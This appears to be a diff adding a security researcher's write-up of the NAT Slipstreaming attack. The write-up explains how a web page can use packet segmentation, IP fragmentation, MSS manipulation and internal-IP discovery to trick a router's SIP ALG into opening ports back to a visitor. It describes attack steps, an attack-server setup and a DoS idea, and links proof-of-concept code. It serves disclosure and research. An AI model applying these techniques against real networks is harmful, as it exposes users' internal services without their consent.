+From this chart, the most interesting ones (that Chrome does not block) are sane (backup), sip (voip), pptp (vpn), and h323 (voip). We'll choose SIP as it's one of the more ubiquitous of these protocols, and we already see it in some routers' firmware.
+
+Linux specifically has `nf_conntrack_*.c` files for handling connection tracking on a per protocol basis, and `nf_nat_*.c` for packet mangling (modification).
+
+We'll take a quick look at the [SIP connection tracking module](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c)
+
+- [`module_init(nf_conntrack_sip_init)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1698) initialize this connection tracker, calling [`nf_conntrack_sip_init`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1662)
+- [`nf_ct_helper_init(...AF_INET, IPPROTO_TCP, "sip", SIP_PORT...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1676) we expect signaling to come in from IPv4 `AF_INET` TCP `IPPROTO_TCP` port 5060 `SIP_PORT`...this occurs for UDP, TCP, IPv4 & IPv6
+- [`sip_help_tcp(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1524) called when matching TCP SIP packet comes in
+  - [`process_sip_msg(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1500) if this looks like a potential SIP packet
+     - [`process_sip_request(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1444) is this is a request
+     - [`strncasecmp(*dptr, handler->method, ...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1476-L1478) **the handler will bail unless the method (eg, REGISTER) occurs at the *start* of the data portion of the packet (TCP or UDP)** like we saw with INVITE up above...[REGISTER](https://tools.ietf.org/html/rfc2543#section-4.2.6) is just another SIP command
+     - this is a challenge as if we're only using a web browser, we can't produce a raw TCP connection and start any packet with our own data, as it will be filled with HTTP/TLS headers...or can we?
+     - [`process_register_request(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1216)[`nf_ct_expect_init(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1289) via [`sip_handlers`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1391) we initialize the firewall pinhole (port to allow remove person to connect back in), but we don't open it just yet
+     - [`nf_nat_sip_hooks`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1295) -> [`nf_nat_sip(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_nat_sip.c#L144) the NAT also mangles (rewrites) the internal IP address of the client to the NAT's public IP so the destination can properly reach it
+- [`sip_help_tcp(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1524) -> [`process_sip_msg(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1500) ->
+  - [`process_sip_response(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1400) now we're looking at SIP response from the SIP server
+      - [`process_register_response(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1314) -> [`refresh_signalling_expectation(...)`](https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c#L1381) the port is forwarded by the NAT only once a valid SIP response is sent by the SIP server
+
+
+## Packet Boundary Control
+
+As far as we know, we can't make the browser force an outbound TCP connection with whatever traffic we want, and it's necessary for us to create a TCP/UDP packet starting with a SIP method such as REGISTER or INVITE.
+
+Flash used to allow outbound sockets, but was in a format that we didn't have full control of. Java requires permission. WebSockets are still HTTP. TLS is encrypted. [WebRTC (RFC 7742)](https://tools.ietf.org/html/rfc7742) is encrypted. [STUN (RFC 3489)](https://tools.ietf.org/html/rfc3489) and [TURN (RFC 5766)](https://tools.ietf.org/html/rfc5766) are in fixed formats, and [TURNS (RFC 7065)](https://tools.ietf.org/html/rfc7065) is encrypted.
+
+## TCP Segmentation
+
+At a high level, we can't control the start of the TCP packet, but what if we send too big of a packet? There must be a maximum packet size...at which point, a packet must be fragmented into multiple packets. **If we can overflow the TCP packet size and precisely control part of the data, could we cause packet segmentation and have our data be at the very beginning of our next, overflowed packet?**
+
+Well, we would need to know how much data the browser will send, which will be different per browser, and even by user as they may send different HTTP headers. HTTPS won't work as most of the content is encrypted, where an HTTP POST allows us to control a large portion of the header.
+
+To get the general size of the packet, we send a **large** (6000 byte) HTTP POST with an ID and padding data with a hidden web form to our http://our.attack.server:5060/pktsize. On the attack server, we run a [packet sniffer](TODO) which looks for the boundaries of our packet to determine MTU (Maximum Transmission Unit) size, IP header size, potential IP options, TCP header size, potential TCP options, data packet size, and what portion of the packet we control.
+
+We also run a [custom server](TODO) that listens on TCP port 5060, and responds with HTTP traffic to appease the browser so nothing looks fishy on the client side (a server with a malformed response would cause errors in the console, or an incorrectly responding server would keep the status spinner going).
+
+![POST large form to measure MTU and TCP data size](img/sniff2.png)
+
+We further attempt to control the TCP packet data size by sending a Maximum Segment Size (mss) TCP Option during the initial SYN response to manipulate the victim's outbound packet sizes ([RFC 793 x3.1](https://tools.ietf.org/html/rfc793#section-3.1)). This tells the victim machine to keep TCP packets to a certain size.
+
+![Custom Maximum Segment Size (img/mss)](sniff1.png)
+
+You can do this on Linux by appending `advmss <size>` to `ip route`. We'll use 1500.
+
+```sh
+ip route replace default via [gateway] dev eth0 advmss 1500
+```
+
+Once we get the packets, we send the size data back to the victim client over a separate POST, which sent the victim's ID so we can correlate it with the original request from the victim. At this point, the client has a good idea of how to pad packets to cause arbitrary data to land at any specific location in a TCP packet.
+
+### IP Fragmentation with UDP and TURN
+
+Some NATs only allow UDP ports to be accessed if the SIP connection was originally UDP, so we use TURN in this case. TURN is a protocol supporting relaying for peer-to-peer communication like SIP and WebRTC. TURN is UDP while TURNS (TURN+TLS) is TCP. Modern browsers support TURN for WebRTC in case they can't make a direct peer-to-peer connection with each other for media sharing.
+
+TURN allows authentication via username and password, the username is sent in cleartext. Interestingly, the username is not limited by any size or characters, so we can use this to perform the same type of packet overflow.
+
+Since TURN is over UDP, the IP packet itself will get fragmented if overflowing over the MTU size (UDP doens't support segmentation). The 2nd packet will have not only the data portion under our control, but the UDP header as well! This is not important for our attack, but is interesting and can definitely produce alternate attacks. Ultimately we can perform the same attack through UDP by aligning our packet boundary based off of calculated MTU size rather than MSS size, making our SIP UDP packet live on the 2nd packet boundary (with a fake UDP header prepended) allowing us to forward UDP ports back to our vitim.
+
+## TCP Timing Attack / Internal Subnet & IP Discovery
+
+Oh, this still won't work! In order for the ALG to treat it as a legitimate SIP packet, the IP address you're requesting data to come back on (in the [`Contact`](https://tools.ietf.org/html/rfc2543#section-6.13) SIP line) must be the internal IP (victim) the SIP packet came from, which we don't know. Only the router's public IP address is transmitted to our server (as the NAT rewrites the source IP when it exits the public side).
+
+We see this check in Linux's `nf_conntrack_sip.c`'s [process\_sip\_request](https://github.com/samyk/linux/blob/ea2cec24c8d429ee6f99040e4eb6c7ad627fe777/net/netfilter/nf_conntrack_sip.c#L1260):
+
+![SIP REGISTER Via IP validation](img/nfsipreqcon.png)
+
+In [2010](https://samy.pl/natpin/), we used [LiveConnect](https://developer.mozilla.org/en-US/docs/Archive/Web/LiveConnect) which allowed executing Java code under some conditions from Javascript, extracting the user's local IP. That became obsolete pretty quickly.
+
+On some browsers (Chrome, Firefox), we can use [WebRTC](https://www.w3.org/TR/webrtc/) to grab the victim's internal IP address via [ICE](https://tools.ietf.org/html/rfc5245) (which just use STUN/TURN/TURNS). These are protocols for helping peers behind NATs determine information about themselves. Ironically, no server needs to be used in the ICE "request" as the browser already knows its internal IP, and a remote STUN/TURN server wouldn't know it anyway unless the client sent it in the first place. The problem is not all browsers provide this mechanism.
+
+As of today, using WebRTC to get the local IP address on Chrome, rather than a `.local` mDNS/Bonjour address, requires using HTTPS, but HTTP is necessary for the rest of the attacks, so we first detect if we're on HTTP and if not, rdirect to HTTPS. We then attempt to use WebRTC to extract the local IP address. Either way, we then redirect back to HTTP with the IP(s) appended to the URL to bypass cross-origin restrictions via other communication methods.
+
+### Timing Attack
+
+If using Safari, IE <= 11, or others that don't support WebRTC or intentionally don't reveal internal IP (Safari), we can use a web timing attack to reveal the victim's internal IP address.
+
+We manage this by first producing hidden HTML `<img>` tags on the page, all to common gateways (192.168.*.1, 10.0.0.1, and [others TODO link to natpin github routers code](TODO)), along with Javascript `onsuccess` and `onerror` events. Each time an img is written to the page, a timer is started and if the `onsuccess` loads, that means the IP responded with a web server, and if no web server is running but the IP is on the network, it will send a TCP RST (reset, meaning port not open) back, triggering the `onerror`. If no IP exists, no RST is sent and the response will take > 1 second, at which point we know the IP doesn't exist on our network.
+
+Once we see one of these events trigger, we know a potential internal subnet we're on, then we perform the same attack for every IP on the subnet (eg, 192.168.0.[2-255]), and this time perform a more precise timing to determine which IP responds **fastest**. This is most likely our own (victim) internal IP, as we don't even need to leave the network interface. Even if we aren't first for some reason, we still attempt our attack on all IPs that responded on the network.
+
+## Browser Protocol Confusion
+
+Once the client gets the packet sizes and internal IP address, it constructs a specially crafted web form that pads the POST data up until we believe the packet will become fragmented, at which point our SIP REGISTER containing internal IP address is appended. The form is submitted via Javascript with no consent from the victim. :)
+
+[![successful packet broken into valid SIP packet](img/pinpkt.png)](img/pinpkt.png)
+
+### Live Browser Packet Alteration
+
+On our attack server, because we can see the packets come in, we look to see if the SIP packet was rewritten with the public IP address. If it wasn't, we communicate back the client (automatically) that the SIP packet was not on the expected packet boundary and not rewritten, and we provide the new boundary position from our sniffer.
+
+The client code automatically adjusts its packet size to the new size only after two failures in a row. Some browsers (Firefox) will sometimes have a slightly different packet size due to the multipart-boundary they generate for the form, which unlike most other browsers, is not a fixed length. I find after about 10 tries, the same size will be used and the attack will succeed.
+
+Once the SIP packet lands on the packet boundary, the NAT will be deceived, believing this is a legitimate SIP registeration and from a SIP client on the victim's machine. Once our server responds with a proper SIP response (nested inside of a proper HTTP response to allow the browser to not detect anything fishy), the NAT will open up the port in the original packet we had the victim send and the router will now **forward any port the attacker chooses back to the internal victim, all from simply browsing to a website**.
+
+Attack complete. Attacker can now connect to arbitrary TCP/UDP services running on victim.
+
+# Other Findings
+
+These are not used in this attack, but are interesting nonetheless and could potentially be used for other attacks.
+
+- IP fragmentation allows full control of all data in the IP data section, meaning full control of a UDP header including source/dest ports in the overflowed packet
+  - victim IP stack reassembles and won't parse the data, however the NAT that the packet flows through will be susceptible
+  - allows bypassing browser or system firewall as only UDP port that's inspected is the original packet, not the overflowed fragmented packet
+- DoS a SIP client by sending `Expires: 0` and removing conntrack for someone else
+- If a port is already taken, port listened to is incremented until port overflows to 0
+- STUN does not have authentication implemented in any modern browser
+
+
+# Download
+
+Thanks for reading! You can download the proof of concept code from my [NAT Slipstream github](https://github.com/samyk/slipstream).
+
+# Contact
+
+**Point of Contact:** [@SamyKamkar](https://twitter.com/samykamkar)
+
+You can see more of my projects at <https://samy.pl> or (potentially) reach me at <code@samy.pl>.
+
+-----------------
+
+```
+too late...
+TODO explain ftp alg (sequence chart) in connection tracking section
+TODO example code in timing attack - allow user to try it
+TODO packet viewer?
+TODO show connection tracking working (interactively?)
+- manim make packet structure
+- manim sequence diagram?
+- 3way handshake for segment size option
+- show tuple in table
+TODO dark mode (and img)
+TODO switch to websockets?
+TODO Portscan with websockets?
+TODO add versions to browsers tested
+TODO demo blocked port bypass?
+TODO fix up other todos
+TODO make lightbox not take up so much space
+TODO image of lightbox for github?
+TODO spellcheck
+TODO make links open new window
+TODO regenerate toc (how?)
+TODO test opera
+```
